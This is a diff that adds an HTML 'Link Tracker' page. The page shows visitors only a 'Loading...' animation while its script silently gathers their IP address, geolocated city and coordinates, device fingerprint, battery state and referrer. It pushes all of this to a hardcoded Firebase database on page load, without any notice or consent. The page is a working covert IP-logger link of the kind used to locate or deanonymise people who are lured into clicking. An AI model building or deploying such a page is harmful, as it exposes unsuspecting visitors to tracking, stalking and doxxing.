@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading... - Link Tracker</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0a0e17;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .loading-container {
+            text-align: center;
+        }
+        
+        .loading-text {
+            font-size: 32px;
+            color: #00ccff;
+            text-shadow: 0 0 10px rgba(0, 204, 255, 0.7);
+            letter-spacing: 2px;
+            animation: pulse 1.5s infinite alternate;
+        }
+        
+        @keyframes pulse {
+            from {
+                opacity: 0.7;
+                text-shadow: 0 0 5px rgba(0, 204, 255, 0.5);
+            }
+            to {
+                opacity: 1;
+                text-shadow: 0 0 15px rgba(0, 204, 255, 0.9);
+            }
+        }
+        
+        .loading-dots:after {
+            content: '';
+            animation: dots 1.5s infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="loading-text">Loading<span class="loading-dots"></span></div>
+    </div>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_QzbdScTX2dLdu_VchsPH1JL-1tn3RcI",
+            authDomain: "chat-message-fcf6f.firebaseapp.com",
+            databaseURL: "https://chat-message-fcf6f-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "chat-message-fcf6f",
+            storageBucket: "chat-message-fcf6f.firebasestorage.app",
+            messagingSenderId: "137162503818",
+            appId: "1:137162503818:web:2c782da021738705e99f73",
+            measurementId: "G-V6NNC4148E"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Function to get the client's IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting IP address:', error);
+                return 'Unknown';
+            }
+        }
+        
+        // Function to get geolocation data
+        async function getGeolocationData(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                return {
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    country_code: data.country_code,
+                    timezone: data.timezone
+                };
+            } catch (error) {
+                console.error('Error getting geolocation data:', error);
+                return {
+                    country: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    latitude: 0,
+                    longitude: 0,
+                    country_code: 'XX',
+                    timezone: 'UTC+00:00'
+                };
+            }
+        }
+        
+        // Function to get device information
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+        
+        // Function to get battery information
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                }
+            }
+            return {
+                level: null,
+                charging: null,
+                chargingTime: null,
+                dischargingTime: null
+            };
+        }
+        
+        // Function to get mobile carrier information
+        function getCarrierInfo() {
+            // This is a simplified version - in a real app you might use a third-party API
+            const mccMnc = {
+                '510-10': 'Telkomsel',
+                '510-11': 'XL Axiata',
+                '510-21': 'Indosat',
+                '510-27': 'Tri',
+                '510-28': 'Smartfren',
+                '510-89': '3',
+                // Add more MCC-MNC codes as needed
+            };
+            
+            // Simulate getting carrier based on IP geolocation
+            return 'Unknown'; // Placeholder
+        }
+        
+        // Function to track visitor data
+        async function trackVisitor() {
+            // Get visitor IP address
+            const ip = await getIPAddress();
+            
+            // Get geolocation data
+            const locationData = await getGeolocationData(ip);
+            
+            // Get device information
+            const deviceInfo = getDeviceInfo();
+            
+            // Get battery information
+            const batteryInfo = await getBatteryInfo();
+            
+            // Get carrier information
+            const carrier = getCarrierInfo();
+            
+            // Get referrer information
+            const referrer = document.referrer || 'Direct';
+            
+            // Get current URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const source = urlParams.get('utm_source') || 'Direct';
+            const medium = urlParams.get('utm_medium') || 'None';
+            const campaign = urlParams.get('utm_campaign') || 'None';
+            
+            // Prepare visitor data
+            const visitorData = {
+                timestamp: new Date().toISOString(),
+                ip: ip,
+                country: locationData.country,
+                city: locationData.city,
+                region: locationData.region,
+                latitude: locationData.latitude,
+                longitude: locationData.longitude,
+                country_code: locationData.country_code,
+                timezone: deviceInfo.timezone,
+                userAgent: deviceInfo.userAgent,
+                language: deviceInfo.language,
+                platform: deviceInfo.platform,
+                screenWidth: deviceInfo.screenWidth,
+                screenHeight: deviceInfo.screenHeight,
+                colorDepth: deviceInfo.colorDepth,
+                deviceMemory: deviceInfo.deviceMemory,
+                hardwareConcurrency: deviceInfo.hardwareConcurrency,
+                batteryLevel: batteryInfo.level,
+                batteryCharging: batteryInfo.charging,
+                carrier: carrier,
+                referrer: referrer,
+                utm_source: source,
+                utm_medium: medium,
+                utm_campaign: campaign,
+                page: window.location.href
+            };
+            
+            // Save to Firebase
+            try {
+                const newVisitorRef = database.ref('visitors/').push();
+                newVisitorRef.set(visitorData);
+                
+                console.log('Visitor data saved to Firebase:', visitorData);
+            } catch (error) {
+                console.error('Error saving visitor data:', error);
+            }
+            
+            // Redirect after a short delay (simulate loading)
+            setTimeout(() => {
+                // In a real scenario, you would redirect to the target URL
+                // window.location.href = "https://example.com";
+                
+                // For demo purposes, we'll just show a message
+                document.querySelector('.loading-text').textContent = "Tracking complete!";
+            }, 2000);
+        }
+        
+        // Start tracking when page loads
+        window.addEventListener('load', trackVisitor);
+    </script>
+</body>
+</html>
